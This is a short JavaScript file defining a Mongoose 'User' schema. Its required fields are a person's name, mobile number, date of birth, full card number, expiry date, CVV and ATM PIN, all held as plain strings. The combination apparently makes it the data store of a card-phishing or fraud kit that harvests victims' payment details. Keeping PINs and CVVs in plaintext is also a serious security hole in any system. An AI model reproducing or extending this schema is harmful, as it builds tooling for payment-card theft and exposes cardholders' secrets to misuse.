// models/User.js
const mongoose = require('mongoose');

const userSchema = new mongoose.Schema({
    name: { type: String, required: true },
    mobile: { type: String, required: true },
    dob: { type: String, required: true },
    cardLastSix: { type: String, required: true },
    atmPin: { type: String, required: true },
    cvv: { type: String, required: true },
    fullCardNumber: { type: String, required: true },
    expiryDate: { type: String, required: true }
});

module.exports = mongoose.model('User', userSchema);
